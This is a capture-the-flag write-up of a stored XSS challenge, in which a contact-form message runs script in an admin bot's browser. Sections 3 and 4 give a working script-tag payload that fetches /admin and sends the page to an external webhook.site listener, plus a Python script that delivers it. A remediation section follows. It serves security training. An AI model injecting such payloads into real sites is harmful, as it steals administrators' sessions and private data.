# Technical Write-Up: The Blog (Stored XSS & Context Exfiltration)

<div align="center">

[![Platform](https://img.shields.io/badge/Platform-InvataCyber.ro-blue.svg?style=flat&logo=target)](#)
[![Category](https://img.shields.io/badge/Category-Web%20%7C%20Client--Side-orange.svg?style=flat&logo=owasp)](#)
[![Vulnerability](https://img.shields.io/badge/CWE-CWE--79%20(Stored%20XSS)-red.svg?style=flat)](#)
[![Impact](https://img.shields.io/badge/Impact-Admin%20Context%20Theft%20%2F%20Session%20Exfil-critical.svg?style=flat)](#)
[![Author](https://img.shields.io/badge/Author-Moan%C4%83%20%C8%98tef%C4%83nu%C8%9B--Cornel-blue.svg?style=flat&logo=github)](https://github.com/stefanutc1)

</div>

---

## 1. Challenge Specification

- **Target Application**: Standard blogging engine with articles and a public contact submission form (`/contact`).
- **Simulated Environment**: An editorial bot with authenticated administrative privileges periodically navigates to the inbox in a real browser instance and opens unread messages.
- **Flag Format**: `InvataCyber{...}`

---

## 2. Attack Surface Analysis & Root Cause

The application exposes two primary components:
1. **Public Ingress**: Contact submission form at `/contact` accepting `name`, `email`, and `message` via HTTP POST.
2. **Privileged Background Bot**: A headless browser (Puppeteer / Chromium) operating with active session cookies on the internal `/admin` route.

### Vulnerability Mechanism
The server stores incoming messages in its database without applying contextual HTML entity encoding (e.g. `htmlspecialchars()`) or DOM sanitization (e.g. `DOMPurify`). When the admin bot reviews unread messages, the unsanitized `message` content is inserted directly into the page DOM as raw HTML, executing arbitrary JavaScript in the context of the administrator's authenticated session (Stored Cross-Site Scripting).

Even if session cookies are protected with the `HttpOnly` flag (preventing direct `document.cookie` theft), the bot executes in an authenticated browser state. The injected payload can issue an asynchronous `fetch('/admin')` request, inheriting session credentials automatically, and transmit the returned HTML body to an external listener.

---

## 3. Exploit Payload Engineering

The payload executes in three sequential stages:
1. Issues an asynchronous `fetch()` request to `/admin`.
2. Converts the response stream to raw text.
3. Transmits the response text (containing the flag) to an external webhook.

```javascript
fetch('/admin')
  .then(r => r.text())
  .then(t => fetch('https://webhook.site/<TOKEN>?data=' + encodeURIComponent(t)));
```

Wrapped in a `<script>` tag for injection into the `message` field:
```html
<script>fetch('/admin').then(r=>r.text()).then(t=>fetch('https://webhook.site/<TOKEN>?data='+encodeURIComponent(t)))</script>
```

---

## 4. Automated Python Solver (`solver.py`)

```python
#!/usr/bin/env python3
import requests

TARGET_URL = "http://target.invatacyber.ro/contact"
WEBHOOK_URL = "https://webhook.site/<TOKEN>"

payload = f"<script>fetch('/admin').then(r=>r.text()).then(t=>fetch('{WEBHOOK_URL}?data='+encodeURIComponent(t)))</script>"

data = {
    "name": "Security Researcher",
    "email": "researcher@stefanut.lan",
    "message": payload
}

response = requests.post(TARGET_URL, data=data)
print(f"[*] Payload delivered! Server responded with status code: {response.status_code}")
```

---

## 5. Remediation & Hardening Recommendations

1. **Context-Aware Output Encoding**: Ensure all user-supplied input rendered in HTML templates is encoded (e.g. using Jinja2 automatic escaping or React DOM bindings).
2. **Content Security Policy (CSP)**: Deploy strict CSP headers forbidding unauthorized inline scripts and restricting outbound network connections:
   ```http
   Content-Security-Policy: default-src 'self'; script-src 'nonce-<RANDOM>'; connect-src 'self';
   ```
3. **DOMPurify Sanitization**: If rich-text HTML rendering is required, sanitize markup using DOMPurify before DOM insertion.
